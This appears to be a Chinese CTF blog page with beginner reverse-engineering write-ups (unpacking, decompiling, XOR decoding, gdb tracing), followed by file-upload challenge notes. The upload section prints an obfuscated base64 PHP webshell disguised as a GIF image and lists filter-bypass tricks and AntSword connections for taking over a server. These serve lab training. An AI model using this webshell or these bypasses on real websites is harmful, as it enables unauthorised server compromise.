<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c0ffee</span><br></pre></td></tr></table></figure>
<h1 id="simple-unpack"><a href="#simple-unpack" class="headerlink" title="simple-unpack"></a>simple-unpack</h1><p>考察：IDA，winhex</p>
<p>方法1：winhex</p>
<p>注意有不可识别字符，直接去掉即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Upx_1s_n0t_a_d3liv3r_c0mp4ny&#125;</span><br></pre></td></tr></table></figure>
<p>方法2：ida</p>
<p>同理</p>
<p>方法3：upx+ida</p>
<p>upx脱壳后，再用ida查看</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;upx.exe -d 文件名</span><br></pre></td></tr></table></figure>


<h1 id="insanity"><a href="#insanity" class="headerlink" title="insanity"></a>insanity</h1><p>与simple-unpack同理</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9447&#123;This_is_a_flag&#125;</span><br></pre></td></tr></table></figure>
<h1 id="python-trade"><a href="#python-trade" class="headerlink" title="python-trade"></a>python-trade</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"># uncompyle6 version 3.7.4</span><br><span class="line"># Python bytecode 2.7 (62211)</span><br><span class="line"># Decompiled from: Python 2.7.18 (v2.7.18:8d21aa21f2, Apr 20 2020, 13:25:05) [MSC v.1500 64 bit (AMD64)]</span><br><span class="line"># Embedded file name: 1.py</span><br><span class="line"># Compiled at: 2017-06-03 10:20:43</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">def encode(message):</span><br><span class="line">    s &#x3D; &#39;&#39;</span><br><span class="line">    for i in message:</span><br><span class="line">        x &#x3D; ord(i) ^ 32</span><br><span class="line">        x &#x3D; x + 16</span><br><span class="line">        s +&#x3D; chr(x)</span><br><span class="line"></span><br><span class="line">    return base64.b64encode(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">correct &#x3D; &#39;XlNkVmtUI1MgXWBZXCFeKY+AaXNt&#39;</span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">print &#39;Input flag:&#39;</span><br><span class="line">flag &#x3D; raw_input()</span><br><span class="line">if encode(flag) &#x3D;&#x3D; correct:</span><br><span class="line">    print &#39;correct&#39;</span><br><span class="line">else:</span><br><span class="line">    print &#39;wrong&#39;</span><br><span class="line"># okay decompiling 2.pyc</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>反着写一个decode</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">def encode(message):</span><br><span class="line">    s &#x3D; &#39;&#39;</span><br><span class="line">    imessage &#x3D; base64.b64decode(message)</span><br><span class="line">    for i in imessage:</span><br><span class="line">        x &#x3D; ord(i) - 16</span><br><span class="line">        x &#x3D; x ^ 32</span><br><span class="line">        s +&#x3D; chr(x)</span><br><span class="line">	return s</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>此段只能用python2.7编译，用python3.9编译会出错（主要是for那段，猜测取消了这种for循环写法）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nctf&#123;d3c0mpil1n9_PyC&#125;</span><br></pre></td></tr></table></figure>


<h1 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h1><p>考察：IDA的使用</p>
<p>打开IDA，使用PE方式打开exe</p>
<p>单击main，按<strong>F5</strong>进入反编译</p>
<p>观察代码，提示要找到变量v5</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v3 &#x3D; strcmp(v5.m128i_i8, v9);</span><br></pre></td></tr></table></figure>
<p>而v5从另外一个地方来</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v5 &#x3D; _mm_loadu_si128((const __m128i *)&amp;xmmword_413E34);</span><br></pre></td></tr></table></figure>
<p><strong>双击xmmword_413E34</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.rdata:00413E34 xmmword_413E34  xmmword 3074656D30633165577B465443545544h</span><br><span class="line">.rdata:00413E34                                         ; DATA XREF: _main+10↑r</span><br><span class="line">.rdata:00413E44 qword_413E44    dq 7D465443545544h      ; DATA XREF: _main+27↑r</span><br></pre></td></tr></table></figure>
<p>将3074656D30633165577B465443545544h和7D465443545544h 转换为字符串</p>
<p><strong>单击字符串，右键，</strong>选择有花括号那个选项（字符模式）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.rdata:00413E34 xmmword_413E34  xmmword &#39;0tem0c1eW&#123;FTCTUD&#39;</span><br><span class="line">.rdata:00413E34                                         ; DATA XREF: _main+10↑r</span><br><span class="line">.rdata:00413E44 qword_413E44    dq &#39;&#125;FTCTUD&#39;            ; DATA XREF: _main+27↑r</span><br></pre></td></tr></table></figure>
<p>由于汇编存储为小端格式，将结果倒过来即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DUTCTF&#123;We1c0met0DUTCTF&#125;</span><br></pre></td></tr></table></figure>
<h1 id="game"><a href="#game" class="headerlink" title="game"></a>game</h1><p>打开exe，尝试输入1-8的数字，输入8时得到答案</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zsctf&#123;T9is_tOpic_1s_v5ry_int7resting_b6t_others_are_n0t&#125;</span><br></pre></td></tr></table></figure>
<p>当然正确做法肯定不是瞎猜</p>
<p>关键代码段</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">    if ( v5 )</span><br><span class="line">&#123;</span><br><span class="line">  sub_4576D6(v5 - 1);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">  for ( i &#x3D; 0; i &lt; 8; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( (unsigned int)i &gt;&#x3D; 9 )</span><br><span class="line">      j____report_rangecheckfailure();</span><br><span class="line">    byte_532E28[i] &#x3D; 0;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">j__system(&quot;CLS&quot;);</span><br><span class="line">sub_458054();</span><br><span class="line">if ( byte_532E28[0] &#x3D;&#x3D; 1</span><br><span class="line">  &amp;&amp; byte_532E28[1] &#x3D;&#x3D; 1</span><br><span class="line">  &amp;&amp; byte_532E28[2] &#x3D;&#x3D; 1</span><br><span class="line">  &amp;&amp; byte_532E28[3] &#x3D;&#x3D; 1</span><br><span class="line">  &amp;&amp; byte_532E28[4] &#x3D;&#x3D; 1</span><br><span class="line">  &amp;&amp; byte_532E28[5] &#x3D;&#x3D; 1</span><br><span class="line">  &amp;&amp; byte_532E28[6] &#x3D;&#x3D; 1</span><br><span class="line">  &amp;&amp; byte_532E28[7] &#x3D;&#x3D; 1 )</span><br><span class="line">&#123;</span><br><span class="line">  sub_457AB4();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>要么破解 sub_4576D6(v5 - 1)，使所有的byte数组为1</p>
<p>要么破解sub_457AB4()，使直接输出flag</p>
<h1 id="hello，ctf"><a href="#hello，ctf" class="headerlink" title="hello，ctf"></a>hello，ctf</h1><p>考察：ida的使用</p>
<p>反编译后，核心函数段</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">strcpy(v13, &quot;437261636b4d654a757374466f7246756e&quot;);</span><br><span class="line">while ( 1 )</span><br><span class="line">&#123;</span><br><span class="line">  memset(v10, 0, sizeof(v10));</span><br><span class="line">  v11 &#x3D; 0;</span><br><span class="line">  v12 &#x3D; 0;</span><br><span class="line">  sub_40134B((int)aPleaseInputYou, v6);</span><br><span class="line">  scanf(&quot;%s&quot;, v9);</span><br><span class="line">  if ( strlen(v9) &gt; 0x11 )</span><br><span class="line">    break;</span><br><span class="line">  for ( i &#x3D; 0; i &lt; 17; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 &#x3D; v9[i];</span><br><span class="line">    if ( !v4 )</span><br><span class="line">      break;</span><br><span class="line">    sprintf(Buffer, &quot;%x&quot;, v4);</span><br><span class="line">    strcat(v10, Buffer);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( !strcmp(v10, v13) )</span><br><span class="line">    sub_40134B((int)aSuccess, v7);</span><br><span class="line">  else</span><br><span class="line">    sub_40134B((int)aWrong, v7);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看到v13字符串被437261636b4d654a757374466f7246756e赋值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">437261636b4d654a757374466f7246756e</span><br><span class="line">十六进制转换字符后得到</span><br><span class="line">CrackMeJustForFun</span><br></pre></td></tr></table></figure>
<p>可以看到v10和v13相等时，会传递aSuccess</p>
<p>此处就有一个经验之谈了，就是之后的函数sub_40134B很复杂，不需要继续解读，因此我们只需要提交v13的值即可</p>
<h1 id="logmein"><a href="#logmein" class="headerlink" title="logmein"></a>logmein</h1><p>考察：代码编写</p>
<p>在IDA中，关键代码段为</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">v9 = <span class="number">0</span>;</span><br><span class="line"> <span class="built_in">strcpy</span>(v8, <span class="string">&quot;:\&quot;AL_RT^L*.?+6/46&quot;</span>);</span><br><span class="line"> v7 = <span class="number">0x65626D61726168</span>LL;</span><br><span class="line"> v6 = <span class="number">7</span>;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;Welcome to the RC3 secure password guesser.\n&quot;</span>);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;To continue, you must enter the correct password.\n&quot;</span>);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;Enter your guess: &quot;</span>);</span><br><span class="line"> __isoc99_scanf(<span class="string">&quot;%32s&quot;</span>, s);</span><br><span class="line"> v3 = <span class="built_in">strlen</span>(s);</span><br><span class="line"> <span class="keyword">if</span> ( v3 &lt; <span class="built_in">strlen</span>(v8) )</span><br><span class="line">   sub_4007C0();</span><br><span class="line"> <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(s); ++i )</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="keyword">if</span> ( i &gt;= <span class="built_in">strlen</span>(v8) )</span><br><span class="line">     sub_4007C0();</span><br><span class="line">   <span class="keyword">if</span> ( s[i] != (<span class="keyword">char</span>)(*((_BYTE *)&amp;v7 + i % v6) ^ v8[i]) ) <span class="comment">// BYTE指字节</span></span><br><span class="line">     sub_4007C0();</span><br><span class="line"> &#125;</span><br><span class="line"> sub_4007F0();</span><br></pre></td></tr></table></figure>
<p>可以得知，只要输入的s=v8，做一些运算后即可得到答案</p>
<p>c++版本</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt; // BYTE类型必须</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> v8[<span class="number">80</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(v8, <span class="string">&quot;:\&quot;AL_RT^L*.?+6/46&quot;</span>);</span><br><span class="line">	<span class="keyword">long</span> <span class="keyword">long</span> v7 = <span class="number">28537194573619560LL</span>;</span><br><span class="line">	<span class="keyword">int</span> v6 = <span class="number">7</span>;</span><br><span class="line">	<span class="built_in">string</span> ans = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">for</span> ( <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(v8); ++i )&#123;</span><br><span class="line">	    ans += (<span class="keyword">char</span>)(*((BYTE *)&amp;v7 + i % <span class="number">7</span>) ^ v8[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt;<span class="string">&quot;debug1 &quot;</span> &lt;&lt; ans;</span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>python版本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># v7 = 28537194573619560LL</span></span><br><span class="line">v7_1 = <span class="string">&#x27;harambe&#x27;</span>  <span class="comment"># 需要转换为字符串（因为BYTE类型），并且由于小端序，需要翻转字符串</span></span><br><span class="line">v8 = <span class="string">&quot;:\&quot;AL_RT^L*.?+6/46&quot;</span></span><br><span class="line">v6 = <span class="number">7</span></span><br><span class="line">ans = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v8)):</span><br><span class="line">	c = <span class="built_in">ord</span>(v7_1[i%<span class="number">7</span>]) ^ <span class="built_in">ord</span>(v8[i])</span><br><span class="line">	ans += <span class="built_in">chr</span>(c)</span><br><span class="line">	print(ans)</span><br></pre></td></tr></table></figure>


<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RC3-2016-XORISGUD</span><br></pre></td></tr></table></figure>
<h1 id="no-strings-attached"><a href="#no-strings-attached" class="headerlink" title="no-strings-attached"></a>no-strings-attached</h1><p>考察：IDA使用，gbd使用，exeinfope使用</p>
<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/zyh18851473527/article/details/105704672">https://blog.csdn.net/zyh18851473527/article/details/105704672</a></p>
<p>先使用exeinfo，判断其为linux下的文件</p>
<p>将文件拖入IDA</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  setlocale(6, &amp;locale);</span><br><span class="line">  banner();</span><br><span class="line">  prompt_authentication();</span><br><span class="line">  authenticate();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>进入authenticate</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">void authenticate()</span><br><span class="line">&#123;</span><br><span class="line">  wchar_t ws[8192]; &#x2F;&#x2F; [esp+1Ch] [ebp-800Ch] BYREF</span><br><span class="line">  wchar_t *s2; &#x2F;&#x2F; [esp+801Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  s2 &#x3D; (wchar_t *)decrypt((wchar_t *)&amp;s, (wchar_t *)&amp;dword_8048A90);</span><br><span class="line">  if ( fgetws(ws, 0x2000, stdin) )</span><br><span class="line">  &#123;</span><br><span class="line">    ws[wcslen(ws) - 1] &#x3D; 0;</span><br><span class="line">    if ( !wcscmp(ws, s2) )</span><br><span class="line">      wprintf(&amp;unk_8048B44);</span><br><span class="line">    else</span><br><span class="line">      wprintf(&amp;unk_8048BA4);</span><br><span class="line">  &#125;</span><br><span class="line">  free(s2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此处有两种思路</p>
<p>一种是跟进decrypt，分析运算逻辑，写脚本</p>
<p>一种是动态调试</p>
<p>查看汇编代码，找到decrypt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">text:08048720                 call    decrypt</span><br><span class="line">.text:08048725                 mov     [ebp+s2], eax</span><br></pre></td></tr></table></figure>
<p>即eax存储着返回值</p>
<p>打开kali，进入gdb</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gbd</span><br></pre></td></tr></table></figure>
<p>打开文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file 1 &#x2F;&#x2F; 文件改名为1</span><br></pre></td></tr></table></figure>
<p>设置decrypt为断点</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b decrypt</span><br></pre></td></tr></table></figure>
<p>执行到断点</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r</span><br></pre></td></tr></table></figure>
<p>单步执行到decrypt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n</span><br></pre></td></tr></table></figure>
<p>显示寄存器</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">i r</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">eax            0x804e800           134539264</span><br><span class="line">ecx            0x1480              5248</span><br><span class="line">edx            0x7d                125</span><br><span class="line">ebx            0x0                 0</span><br><span class="line">esp            0xffff5300          0xffff5300</span><br><span class="line">ebp            0xffffd328          0xffffd328</span><br><span class="line">esi            0xf7fac000          -134561792</span><br><span class="line">edi            0xf7fac000          -134561792</span><br><span class="line">eip            0x8048725           0x8048725 &lt;authenticate+29&gt;</span><br><span class="line">eflags         0x282               [ SF IF ]</span><br><span class="line">cs             0x23                35</span><br><span class="line">ss             0x2b                43</span><br><span class="line">ds             0x2b                43</span><br><span class="line">es             0x2b                43</span><br><span class="line">fs             0x0                 0</span><br><span class="line">gs             0x63                99</span><br></pre></td></tr></table></figure>
<p>查看eax的值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x&#x2F;6sw $eax</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x804e800:    U&quot;9447&#123;you_are_an_international_mystery&#125;&quot;</span><br><span class="line">0x804e89c:    U&quot;W\001\xf7ade1e8\xf7ade1ea\xf7ade1ec\xf7ade1ee\xf7ade1f0\xf7ade1f2\xf7ade1f4\xf7ade1f6\xf7ade1f8\xf7ade1fa\001\xf7ade200\xf7ade204\xf7ade208\xf7ade20c\xf7ade210\xf7ade214\xf7ade218\xf7ade21c\xf7ade220\xf7ade224\xf7ade228\xf7ade22a\xf7ade22c\xf7ade22e\xf7ade230\xf7ade232\xf7ade234\xf7ade236\xf7ade238\xf7ade23a\060\061\062\063\064\065\066\067\070\071\x175a\xf7ade268\xf7ae3fd0\xf7aefaa0\xf7af5808\001\xf7b07f4c&quot;</span><br><span class="line">0x804e968:    U&quot;\xf7b07f54&quot;</span><br><span class="line">0x804e970:    U&quot;&quot;</span><br><span class="line">0x804e974:    U&quot;\xf7b07f7c\xf7b088b8\xf7b09234\xf7b0aa74\xf7b0acec\xf7b0af64\xf7b0b29c\xf7b0d194\xf7b0f08c\xf7b0f3c4\xf7b0f67c\xf7b10f74\xf7b127b4\xf7b138e4\xf7b14854\xf7b14b6c\xf7b1a988\xf7b1fba4\021\x435f687a\x54552e4e\x382d46\021\x435f687a\x54552e4e\x382d46!\x804ea00\001\x804ea80\001&quot;</span><br><span class="line">0x804e9f4:    U&quot;&quot;</span><br></pre></td></tr></table></figure>


<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9447&#123;you_are_an_international_mystery&#125;</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/02/12/CTF-wp-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Creverse%E5%88%9D%E7%BA%A7/" data-id="ckla3x5dq0001z0us7axj8uf4" data-title="CTF-wp-攻防世界reverse初级" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-CTF-Web-文件上传" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/02/08/CTF-Web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="article-date">
  <time class="dt-published" datetime="2021-02-08T03:16:11.000Z" itemprop="datePublished">2021-02-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/02/08/CTF-Web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">CTF-Web-文件上传</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h1><p>来源：极客大挑战 2019</p>
<p>考察：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;sqzr.phtml&quot;</span><br><span class="line">Content-Type: image&#x2F;jpeg</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">PD9waHAgDQokdWY9InNuYzMiOyAvL3Bhc3MgaXMgc3F6cg0KJGthPSJJRUJsZG1GYnNLIjsgDQokcGp0PSJDUmZVRTlUVkYiOyANCiR2YmwgPSBzdHJfcmVwbGFjZSgidGkiLCIiLCJ0aXN0aXR0aXJ0aV9ydGlldGlwbHRpYXRpY2UiKTsgDQokaXF3PSJGNmNpZGRLVHM9IjsgDQokYmtmID0gJHZibCgiayIsICIiLCAia2Jha3NrZTZrNGtfa2RrZWtja29rZGtlIik7IA0KJHNicCA9ICR2YmwoImN0dyIsIiIsImN0d2NjdHdyZWN0d2F0Y3R3ZWN0d19mY3R3dW5jY3R3dGN0d2lvY3R3biIpOyANCiRtcHkgPSAkc2JwKCcnLCAkYmtmKCR2YmwoImIiLCAiIiwgJGthLiRwanQuJHVmLiRpcXcpKSk7ICRtcHkoKTsgDQo&#x2F;PiA&#x3D;</span><br></pre></td></tr></table></figure>
<h1 id="uploadlabs"><a href="#uploadlabs" class="headerlink" title="uploadlabs"></a>uploadlabs</h1><h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><p>考察：前端js检查绕过</p>
<p>在firefox中禁用js选项即可</p>
<h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><p>考察：content-type绕过</p>
<p>源码检查content-type，修改为image/jpeg，image/png，image/gif其中一个即可</p>
<h2 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h2><p>考察：后缀绕过</p>
<p>将后缀改为php3即可（还可以为php2，php4，php5，phtml）</p>
<h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><p>考察：后缀绕过</p>
<p>后缀设置了大量黑名单</p>
<p>将后缀改为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php. .</span><br></pre></td></tr></table></figure>
<p>由于值祛除了一次文件名末尾的点，然后再去除空格，因此. .可以实现过滤</p>
<h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><p>考察：后缀绕过</p>
<p>后缀改为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php . .</span><br></pre></td></tr></table></figure>
<h1 id="CTFHub"><a href="#CTFHub" class="headerlink" title="CTFHub"></a>CTFHub</h1><h2 id="无验证"><a href="#无验证" class="headerlink" title="无验证"></a>无验证</h2><p>直接上传，用antsword连接（菜刀被禁了）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;fca79403ea30c31b6413be65&#125;</span><br></pre></td></tr></table></figure>
<h2 id="前端验证"><a href="#前端验证" class="headerlink" title="前端验证"></a>前端验证</h2><p>取消前端js后，直接上传，用antsword连接</p>
<p>php文件无法下载，也不知道为什么</p>
<p>直接在页面执行命令，用cat查看flag文件</p>
